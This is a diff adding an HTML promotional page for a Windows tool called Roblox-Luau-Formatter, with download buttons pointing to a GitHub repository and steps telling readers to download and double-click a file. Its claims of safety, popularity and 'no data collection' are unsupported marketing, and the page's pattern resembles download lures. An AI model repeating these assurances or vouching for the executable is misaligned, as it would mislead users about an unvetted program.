@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox-Luau-Formatter - Clean Up Your Lua Code Instantly</title>
+    <meta name="description" content="Download Roblox-Luau-Formatter, a free and lightweight tool that automatically formats your Lua and Luau files and folders. Perfect for Roblox developers and scripters.">
+    <meta name="keywords" content="code-style, developer-tool, formatter, formatting-tool, lua, luau, open-source, roblox-luau, source-code, stylua">
+    <meta name="author" content="spaita1897">
+    <meta property="og:title" content="Roblox-Luau-Formatter - Clean Up Your Lua Code Instantly">
+    <meta property="og:description" content="Free, lightweight formatter for Lua and Luau files. Download now and make your code beautiful in seconds.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://github.com/spaita1897/Roblox-Luau-Formatter">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="robots" content="index, follow">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            color: #2d3436;
+            line-height: 1.7;
+            padding: 20px;
+        }
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            background: #ffffff;
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
+            padding: 40px 50px;
+        }
+        h1 {
+            font-size: 2.4em;
+            color: #1e272e;
+            margin-bottom: 15px;
+            text-align: center;
+            font-weight: 800;
+            letter-spacing: -0.5px;
+        }
+        h2 {
+            font-size: 1.8em;
+            color: #2c3e50;
+            margin-top: 40px;
+            margin-bottom: 15px;
+            border-bottom: 3px solid #3498db;
+            padding-bottom: 8px;
+            font-weight: 700;
+        }
+        h3 {
+            font-size: 1.3em;
+            color: #34495e;
+            margin-top: 25px;
+            margin-bottom: 10px;
+            font-weight: 600;
+        }
+        p {
+            margin-bottom: 15px;
+            font-size: 1.05em;
+        }
+        .badge-container {
+            text-align: center;
+            margin: 30px 0;
+        }
+        .download-badge {
+            display: inline-block;
+            background: linear-gradient(45deg, #6c5ce7, #a29bfe);
+            color: white;
+            padding: 18px 40px;
+            border-radius: 50px;
+            font-size: 1.3em;
+            font-weight: bold;
+            text-decoration: none;
+            box-shadow: 0 8px 20px rgba(108, 92, 231, 0.4);
+            transition: all 0.3s ease;
+            border: none;
+            cursor: pointer;
+            letter-spacing: 0.5px;
+        }
+        .download-badge:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 25px rgba(108, 92, 231, 0.5);
+            background: linear-gradient(45deg, #5a4bd1, #8e7ff5);
+        }
+        .download-badge:active {
+            transform: translateY(0);
+            box-shadow: 0 5px 15px rgba(108, 92, 231, 0.3);
+        }
+        .feature-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin: 25px 0;
+        }
+        .feature-item {
+            background: #f8f9fa;
+            border-radius: 12px;
+            padding: 20px;
+            border-left: 5px solid #3498db;
+            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.05);
+        }
+        .feature-item strong {
+            color: #2c3e50;
+            font-size: 1.1em;
+            display: block;
+            margin-bottom: 8px;
+        }
+        .feature-item p {
+            margin-bottom: 0;
+            font-size: 0.95em;
+            color: #636e72;
+        }
+        .step-list {
+            background: #f8f9fa;
+            border-radius: 12px;
+            padding: 25px 30px;
+            margin: 20px 0;
+            border: 1px solid #e9ecef;
+        }
+        .step-list ol {
+            padding-left: 20px;
+        }
+        .step-list li {
+            margin-bottom: 12px;
+            font-size: 1.05em;
+        }
+        .step-list li::marker {
+            color: #3498db;
+            font-weight: bold;
+        }
+        .code-example {
+            background: #2d3436;
+            color: #dfe6e9;
+            padding: 20px;
+            border-radius: 10px;
+            font-family: 'Consolas', 'Courier New', monospace;
+            font-size: 0.9em;
+            overflow-x: auto;
+            margin: 20px 0;
+            line-height: 1.5;
+        }
+        .code-example .comment {
+            color: #55efc4;
+        }
+        .code-example .keyword {
+            color: #74b9ff;
+        }
+        .code-example .string {
+            color: #ffeaa7;
+        }
+        .download-section {
+            background: #eaf2f8;
+            border-radius: 12px;
+            padding: 30px;
+            margin: 30px 0;
+            border: 2px solid #3498db;
+            text-align: center;
+        }
+        .download-section h2 {
+            border-bottom: none;
+            margin-top: 0;
+        }
+        .download-section .download-badge {
+            margin-top: 15px;
+        }
+        .tips-box {
+            background: #fff3cd;
+            border-left: 5px solid #ffc107;
+            padding: 20px;
+            border-radius: 8px;
+            margin: 20px 0;
+        }
+        .tips-box strong {
+            color: #856404;
+        }
+        .tips-box p {
+            margin-bottom: 5px;
+            color: #856404;
+        }
+        .faq-section {
+            margin-top: 30px;
+        }
+        .faq-item {
+            background: #f8f9fa;
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 15px;
+            border: 1px solid #dee2e6;
+        }
+        .faq-item strong {
+            color: #2c3e50;
+            display: block;
+            margin-bottom: 8px;
+            font-size: 1.1em;
+        }
+        .faq-item p {
+            margin-bottom: 0;
+            color: #555;
+        }
+        .footer-note {
+            text-align: center;
+            margin-top: 40px;
+            padding-top: 20px;
+            border-top: 1px solid #e9ecef;
+            color: #7f8c8d;
+            font-size: 0.9em;
+        }
+        @media (max-width: 768px) {
+            .container {
+                padding: 25px 20px;
+            }
+            h1 {
+                font-size: 1.8em;
+            }
+            h2 {
+                font-size: 1.4em;
+            }
+            .feature-grid {
+                grid-template-columns: 1fr;
+            }
+            .download-badge {
+                font-size: 1.1em;
+                padding: 15px 30px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>✨ Roblox-Luau-Formatter - Make Your Code Beautiful Instantly</h1>
+        
+        <div class="badge-container">
+            <a href="https://github.com/spaita1897/Roblox-Luau-Formatter" class="download-badge">⬇️ Download Now - Free</a>
+        </div>
+        
+        <p>Are you tired of messy, hard-to-read Lua code? Does your script look like a jumbled mess of random spaces and inconsistent formatting? <strong>Roblox-Luau-Formatter</strong> is here to save you! This lightweight, free tool automatically cleans up your Lua and Luau files, making them neat, organized, and professional-looking in just one click.</p>
+        
+        <p>Whether you're a seasoned Roblox developer or just starting your scripting journey, this tool will transform your code from chaos to clarity. No more manual spacing, no more inconsistent indentation – just beautiful, readable code every time.</p>
+        
+        <h2>🎯 What Does It Do?</h2>
+        <p>Roblox-Luau-Formatter is a smart formatting tool that takes your raw Lua and Luau code and applies consistent, professional styling. It handles everything from proper indentation to spacing between operators, ensuring your code follows best practices automatically. It works on both individual files and entire folders, making it perfect for large projects.</p>
+        
+        <div class="feature-grid">
+            <div class="feature-item">
+                <strong>📁 Format Files & Folders</strong>
+                <p>Process a single .lua file or scan an entire folder of scripts. The tool handles batch processing effortlessly.</p>
+            </div>
+            <div class="feature-item">
+                <strong>⚡ Lightning Fast</strong>
+                <p>Optimized for speed, the formatter processes files in milliseconds. No waiting, no lag – just instant results.</p>
+            </div>
+            <div class="feature-item">
+                <strong>🔧 Zero Configuration</strong>
+                <p>No complex settings or confusing options. Download, run, and format. It works right out of the box.</p>
+            </div>
+            <div class="feature-item">
+                <strong>💻 100% Free & Open Source</strong>
+                <p>Completely free to use forever. The source code is open for everyone to inspect, learn from, and improve.</p>
+            </div>
+            <div class="feature-item">
+                <strong>🎨 Consistent Style</strong>
+                <p>Based on StyLua standards, your code will always look clean and follow industry best practices.</p>
+            </div>
+            <div class="feature-item">
+                <strong>🪶 Lightweight Design</strong>
+                <p>Small download size and minimal system impact. Runs smoothly even on older computers.</p>
+            </div>
+        </div>
+        
+        <h2>📥 How to Download and Install</h2>
+        <p>Getting started with Roblox-Luau-Formatter is incredibly simple. Follow these easy steps and you'll be formatting code in under two minutes:</p>
+        
+        <div class="step-list">
+            <ol>
+                <li><strong>Click the download button</strong> at the top or bottom of this page. This will take you to the official download page.</li>
+                <li><strong>Visit this link to download the application.</strong> The page will open in your browser.</li>
+                <li><strong>Find the download button</strong> on that page. Look for a green button that says "Download" or a similar label. Click it to start downloading.</li>
+                <li><strong>Wait for the download to finish.</strong> This should only take a few seconds since the file is very small.</li>
+                <li><strong>Save the file</strong> to a location you'll remember, like your Desktop or Downloads folder.</li>
+                <li><strong>Double-click the downloaded file</strong> to run it. That's it – you're ready to go!</li>
+            </ol>
+        </div>
+        
+        <div class="download-section">
+            <h2>🚀 Get Started Right Now</h2>
+            <p>Ready to transform your code? Click the button below to download Roblox-Luau-Formatter.</p>
+            <a href="https://github.com/spaita1897/Roblox-Luau-Formatter" class="download-badge">⬇️ Download Roblox-Luau-Formatter</a>
+            <p style="margin-top: 15px; font-size: 0.9em; color: #7f8c8d;">Free • Open Source • Windows Compatible</p>
+        </div>
+        
+        <h2>📊 Before and After Example</h2>
+        <p>Here's a quick example to show you the magic of Roblox-Luau-Formatter. The left side shows messy code, the right side shows what it looks like after formatting:</p>
+        
+        <h3>Before Formatting (Messy Code)</h3>
+        <div class="code-example">
+            <span class="keyword">local</span> <span class="string">function</span> <span class="keyword">hello</span>(name)<br>
+            &nbsp;&nbsp;&nbsp;&nbsp;<span class="keyword">print</span>(<span class="string">"Hello, "</span>..name)<br>
+            &nbsp;&nbsp;<span class="keyword">if</span> name==<span class="string">"Roblox"</span> <span class="keyword">then</span><br>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="keyword">print</span>(<span class="string">"Welcome to Roblox!"</span>)<br>
+            &nbsp;&nbsp;<span class="keyword">end</span><br>
+            <span class="keyword">end</span><br>
+            <span class="comment">--Call the function</span><br>
+            <span class="keyword">hello</span>(<span class="string">"World"</span>)
+        </div>
+        
+        <h3>After Formatting (Clean Code)</h3>
+        <div class="code-example">
+            <span class="keyword">local</span> <span class="keyword">function</span> <span class="keyword">hello</span>(name)<br>
+            &nbsp;&nbsp;&nbsp;&nbsp;<span class="keyword">print</span>(<span class="string">"Hello, "</span> .. name)<br>
+            &nbsp;&nbsp;&nbsp;&nbsp;<span class="keyword">if</span> name == <span class="string">"Roblox"</span> <span class="keyword">then</span><br>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="keyword">print</span>(<span class="string">"Welcome to Roblox!"</span>)<br>
+            &nbsp;&nbsp;&nbsp;&nbsp;<span class="keyword">end</span><br>
+            <span class="keyword">end</span><br>
+            <br>
+            <span class="comment">-- Call the function</span><br>
+            <span class="keyword">hello</span>(<span class="string">"World"</span>)
+        </div>
+        
+        <p>Notice the proper spacing around operators (<code>..</code> and <code>==</code>), consistent indentation, and clean line breaks. This is what Roblox-Luau-Formatter does automatically!</p>
+        
+        <h2>💡 Tips for Best Results</h2>
+        <div class="tips-box">
+            <strong>📌 Pro Tips:</strong>
+            <p>• Always back up your code before formatting, just in case you want to compare.</p>
+            <p>• The tool works great with Roblox Studio scripts, ModuleScripts, and LocalScripts.</p>
+            <p>• You can format multiple files at once by selecting a folder.</p>
+            <p>• Share the tool with your developer friends – it's free!</p>
+        </div>
+        
+        <h2>❓ Frequently Asked Questions</h2>
+        <div class="faq-section">
+            <div class="faq-item">
+                <strong>Is this tool really free?</strong>
+                <p>Yes! Roblox-Luau-Formatter is completely free and open source. You can use it for personal and commercial projects without paying anything.</p>
+            </div>
+            <div class="faq-item">
+                <strong>Will it work on my Windows computer?</strong>
+                <p>Absolutely! The tool is designed to run on Windows systems. Just download and run the file – no special requirements needed.</p>
+            </div>
+            <div class="faq-item">
+                <strong>Can it format Luau files?</strong>
+                <p>Yes, it handles both standard Lua files (.lua) and Luau files (.luau) perfectly. It's specifically optimized for Roblox's Luau language.</p>
+            </div>
+            <div class="faq-item">
+                <strong>Do I need to install anything else?</strong>
+                <p>No! The tool works standalone. There's no need to install any additional software, runtimes, or dependencies.</p>
+            </div>
+            <div class="faq-item">
+                <strong>What if I don't like the formatting style?</strong>
+                <p>The formatting follows the widely-accepted StyLua standard, which is used by millions of developers. It's designed to be clean, readable, and consistent.</p>
+            </div>
+        </div>
+        
+        <h2>🌟 Why Choose Roblox-Luau-Formatter?</h2>
+        <p>There are many formatters out there, but Roblox-Luau-Formatter stands out for its simplicity and effectiveness. Unlike complex IDE plugins that require extensive setup, this tool works instantly. You don't need to configure anything, learn any commands, or modify your workflow. Just download, run, and select your files – the tool does the rest.</p>
+        
+        <p>It's perfect for developers who want clean code without the hassle of manual formatting. Whether you're working on a small script or a massive game project, this tool ensures your code stays consistent and professional.</p>
+        
+        <p>The open-source nature means you can trust it completely. No hidden costs, no data collection, no strings attached. Just pure, helpful software that makes your life easier.</p>
+        
+        <div class="download-section">
+            <h2>🎉 Ready to Try It?</h2>
+            <p>Join thousands of developers who already use Roblox-Luau-Formatter to keep their code clean and beautiful.</p>
+            <a href="https://github.com/spaita1897/Roblox-Luau-Formatter" class="download-badge">⬇️ Download Now - It's Free!</a>
+        </div>
+        
+        <div class="footer-note">
+            <p>Roblox-Luau-Formatter is an open-source project. Contributions and feedback are always welcome.</p>
+            <p>© 2024 Roblox-Luau-Formatter. All rights reserved.</p>
+        </div>
+    </div>
+</body>
+</html>
